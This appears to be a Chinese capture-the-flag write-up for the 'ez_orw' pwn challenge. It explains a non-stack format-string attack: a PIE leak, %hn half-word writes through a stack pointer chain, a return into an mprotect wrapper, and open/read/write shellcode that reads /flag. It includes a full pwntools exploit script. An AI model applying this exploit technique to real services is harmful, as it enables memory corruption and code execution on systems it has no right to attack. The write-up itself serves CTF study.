# ez_orw

## 题目简述

程序以 PIE 方式运行，在固定地址 `0x114514000` 映射一页可读写内存，并在循环中把最多 `0x200` 字节读入该区域后直接 `printf(user_input)`。seccomp 只允许 `read`、`write`、`open`、`mprotect` 和 `exit`。目标是利用栈上的指针链完成非栈输入格式化字符串写入，把 `say` 的返回地址改到程序自带的 `mprotect` 包装函数，再跳到固定映射中的 ORW Shellcode。

## 解题过程

### 1. 确认格式化字符串与固定映射

`say` 的关键反汇编逻辑为：

```c
read(0, (void *)0x114514000, 0x200);
if (strcmp((char *)0x114514000, "stop") == 0)
    return;
printf((char *)0x114514000);
```

因此输入不在栈上，但 `printf` 仍会从调用者栈中取可变参数。调试可发现第 11、39 个参数形成两级指针链：先通过 `%11$hn` 修改上层指针的低 16 位，使第 39 个参数指向目标栈地址；再用 `%39$hn` 向该地址写入两字节。

`%13$p` 泄露 `main+0`，减去 `0x1451` 得到 PIE 基址。程序中的 `what` 函数位于偏移 `0x13a3`，其作用等价于：

```c
mprotect((void *)0x114514000, 0x1000, 7);
```

### 2. 分两级改写返回链

先把 `say` 的返回地址低 16 位改成 `PIE_BASE + 0x13a3`。随后在下一个栈槽写入固定 Shellcode 地址 `0x114514030`。该地址分成三个小端半字：

```text
0x4030, 0x4514, 0x0001
```

最终发送的数据以 `stop\x00` 开头，使 `say` 退出循环；函数返回后依次执行 `mprotect` 和 ORW Shellcode。

完整利用脚本如下，栈泄露减去 `0x100` 是针对附件二进制调试得到的当前 `say` 返回槽位置：

```python
from pwn import ELF, asm, context, p64, remote

context(os="linux", arch="amd64")

HOST = "TARGET"
PORT = 43000
PROMPT = b"something:"

elf = ELF("./pwn", checksec=False)
io = remote(HOST, PORT)

io.sendafter(PROMPT, b"aaaa%13$p")
io.recvuntil(b"aaaa")
pie_base = int(io.recvn(14), 16) - 0x1451
mprotect_wrapper = pie_base + 0x13A3

io.sendafter(PROMPT, b"aaaa%11$p")
io.recvuntil(b"aaaa")
return_slot = int(io.recvn(14), 16) - 0x100

def write16(address: int, value: int):
    # 先让第 39 个参数指向 address，再写入 value 的低 16 位。
    io.sendafter(
        PROMPT,
        f"%{address & 0xffff}c%11$hn".encode(),
    )
    io.sendafter(
        PROMPT,
        f"%{value & 0xffff}c%39$hn".encode(),
    )

# say 返回到 mprotect 包装函数。
write16(return_slot, mprotect_wrapper)

# mprotect 返回到 0x114514030。
shellcode_address = 0x114514030
write16(return_slot + 8, shellcode_address)
write16(return_slot + 10, shellcode_address >> 16)
write16(return_slot + 12, shellcode_address >> 32)

shellcode = asm(
    """
    mov rdi, 0x114514005
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2
    syscall

    mov rdi, 3
    mov rsi, 0x114514200
    mov rdx, 0x30
    xor rax, rax
    syscall

    mov rdi, 1
    mov rsi, 0x114514200
    mov rdx, 0x30
    mov rax, 1
    syscall
    """
)

payload = (b"stop\x00" + b"/flag").ljust(0x30, b"\x00") + shellcode
io.sendafter(PROMPT, payload)
io.interactive()
```

`/flag` 位于 `0x114514005`，Shellcode 位于 `0x114514030`；二者都来自同一份最终输入。题目归档未保存远端实例的实际 flag，因此不补造具体字符串。

## 方法总结

非栈输入并不会消除格式化字符串漏洞；只要调用 `printf` 时栈上存在可利用的指针链，仍可通过位置参数和 `%hn` 建立任意半字写。本题还要求把 PIE 泄露、固定映射、`mprotect` 包装函数和 seccomp 允许的 ORW 系统调用串成完整控制流。
